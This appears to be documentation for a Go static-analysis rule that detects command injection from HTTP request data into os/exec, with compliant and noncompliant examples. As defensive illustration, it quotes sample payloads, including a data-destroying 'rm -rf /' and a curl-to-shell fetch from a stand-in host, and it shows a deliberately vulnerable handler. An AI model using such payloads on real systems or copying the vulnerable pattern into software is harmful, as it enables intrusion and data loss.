# OS command built from HTTP request data (Go)

`qualor:go/command-injection` · Issue · Severity: High · [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · OWASP Top 10: [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/), [A03:2021 Injection](https://top10.owasp.org/2021/A03_2021-Injection/)

## What it finds

<!-- begin: what-it-finds -->
Data from the HTTP request that reaches an operating-system command started with `os/exec`:

- as part of a script that a shell runs (`exec.Command("sh", "-c", script)`, `cmd /C`,
  `pwsh -Command`), including PowerShell's `-CommandWithArgs` (`-cwa`), its encoded command
  (`pwsh -EncodedCommand`, `-e`, `-ec`) and a script built from request data and then
  Base64-encoded,
- as the PowerShell script to run (`pwsh -File <request>`, or the first argument that is no
  parameter, which pwsh takes for its script), or
- as the program to run (`exec.Command(r.FormValue("tool"))`).

After `-File` and a script, or after the command of `-CommandWithArgs`, PowerShell passes the
remaining arguments to the script as plain values, so request data there is not reported
(`pwsh -File resize.ps1 -c <request>`).

Request data means query and form values, path parameters, headers, cookies and JSON bodies, read
through `net/http` or through Gin, Echo, chi or gorilla/mux.

Code inside a test (a function or method that takes a `*testing.T`, `*testing.B`, `*testing.F`,
`*testing.M` or `testing.TB`, such as the handler of an `httptest` server a test helper starts) is
not reported: it only serves the test's own requests.
<!-- end: what-it-finds -->

## Why it matters

<!-- begin: why-it-matters -->
A shell reads its script as code. A value such as `x; rm -rf /` or `$(curl evil.example | sh)`
then starts commands of the client's choosing, with the rights of the server process. Choosing the
program from the request has the same effect without any shell syntax.
<!-- end: why-it-matters -->

## Example

<!-- begin: example -->
**Noncompliant:** the file name becomes part of a shell script.

```go
package backup

import (
	"net/http"
	"os/exec"
)

func Archive(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	exec.Command("sh", "-c", "tar czf /var/backups/out.tgz "+name).Run()
	w.WriteHeader(http.StatusNoContent)
}
```

**Compliant:** a fixed program, with the file name as a separate argument and no shell.

```go
package backup

import (
	"net/http"
	"os/exec"
)

func Archive(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	exec.Command("tar", "czf", "/var/backups/out.tgz", "--", name).Run()
	w.WriteHeader(http.StatusNoContent)
}
```
<!-- end: example -->

## How to fix

<!-- begin: how-to-fix -->
- Run a fixed program and pass request data as separate arguments:
  `exec.Command("convert", name, "out.png")`. `exec.Command` starts the program directly, so no
  shell parses the arguments.
- Do not hand request data to `sh -c`, `cmd /C`, `pwsh -Command`, `-CommandWithArgs` or
  `-EncodedCommand`, and do not let it choose the script after `pwsh -File`. Pass it as a parameter
  of a fixed script instead: `exec.Command("pwsh", "-File", "resize.ps1", "-Name", name)`.
  Encoding a script in Base64 does not make it safe: PowerShell or the shell decodes it and runs
  it.
- If the program must vary, map the request value to a constant with a `switch` or a map lookup
  (an allow-list), never pass it through.
- Put `--` before values that could start with a dash, so the program does not read them as
  options.
<!-- end: how-to-fix -->

## Frameworks and APIs covered

- `net/http`
- `encoding/json`
- `os/exec`
- Gin
- Echo
- chi
- gorilla/mux

## Known limits

<!-- begin: known-limits -->
- An allow-list written as an `if` check that returns early is not recognised: the checked value
  is still reported. A `switch` or map lookup that yields constants is recognised.
- `os.StartProcess` and `syscall.Exec` are not checked yet.
- Arguments passed as a slice (`exec.Command("sh", args...)`, `exec.Command("pwsh", args...)`)
  and the arguments of a Windows batch file are not followed. A slice after PowerShell's `-File`
  or `-CommandWithArgs` is not followed either; a slice right after `-Command` or
  `-EncodedCommand` counts as the command. A request value given as the PowerShell script and
  followed by a slice (`exec.Command("pwsh", q, extra...)`) is not reported.
- PowerShell's parameters are recognised under the names its documentation lists
  (`-Command`/`-c`, `-CommandWithArgs`/`-cwa`, `-EncodedCommand`/`-e`/`-ec`, `-File`/`-f`), not
  under other abbreviations such as `-enc` or `-Comm`.
- For pwsh, a script name without `.ps1` given after pwsh's own switches
  (`pwsh -NoProfile ./deploy -i <request>`) is not recognised, so the script's switch is taken for
  pwsh's and the value after it is reported. For powershell.exe, a value after its switches
  (`powershell.exe -NoProfile Get-Item <request>`) is not followed.
- Base64 does not count as a sanitizer: request data that is encoded and only decoded into a file
  by the shell is still reported.
- The success flag of a bind or decode call (`ok := c.ShouldBindJSON(&x) == nil`) still counts
  as request data, so formatting it into a shell script is reported.
- Tests are recognised by a testing parameter of the enclosing function only: a handler declared
  on its own in a test file is still reported.
<!-- end: known-limits -->

## Tests

The test file [`rules/go/command/command-injection.go`](../../../rules/go/command/command-injection.go) holds every case the rule reports or accepts:
lines marked `ruleid:` must be reported and lines marked `ok:` must not. The known limits are
marked `todoruleid:` (missed) and `todook:` (wrongly reported). `npm test` runs them with OpenGrep,
and checks the example above as well.

The rule: [`rules/go/command/command-injection.yml`](../../../rules/go/command/command-injection.yml), added in version 2026.10.1.
